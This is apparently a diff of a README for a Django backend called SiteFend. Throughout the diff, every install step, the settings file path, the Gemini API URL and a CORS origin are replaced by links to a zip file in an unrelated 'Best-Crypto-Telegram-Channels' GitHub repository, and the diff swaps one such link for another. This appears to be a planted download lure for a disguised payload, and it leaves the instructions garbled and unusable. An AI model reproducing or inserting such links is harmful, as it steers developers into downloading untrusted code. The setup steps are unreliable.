@@ -26,18 +26,18 @@ This repository contains the backend of the SiteFend application, designed to an
 
 1. Clone the repository:
     ```bash
-    git clone https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip
+    git clone https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip
     cd sitefend-backend
     ```
 
 2. Install the required Python packages:
     ```bash
-    pip install -r https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip
+    pip install -r https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip
     ```
 
 3. Apply the database migrations:
     ```bash
-    python https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip migrate
+    python https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip migrate
     ```
 
 4. Create a `.env` file in the root directory and add your Gemini AI API key and other necessary environment variables:
@@ -47,22 +47,22 @@ This repository contains the backend of the SiteFend application, designed to an
 
 5. Start the Django development server:
     ```bash
-    python https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip runserver
+    python https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip runserver
     ```
 
 ## Configuration
 
-Ensure that your Django settings (`https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip`) include the following configurations:
+Ensure that your Django settings (`https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip`) include the following configurations:
 
 ```python
-# https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip
+# https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip
 
 GEMINI_API_KEY = 'your-gemini-api-key'
-GEMINI_API_URL = 'https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip'
+GEMINI_API_URL = 'https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip'
 
 CORS_ALLOWED_ORIGINS = [
     'http://localhost',
-    'https://*https://raw.githubusercontent.com/algobytesolutions/Best-Crypto-Telegram-Channels/main/analyzer/Telegram_Crypto_Best_Channels_v1.3.zip',
+    'https://*https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip',
 ]
 
 ALLOWED_HOSTS = ['*']
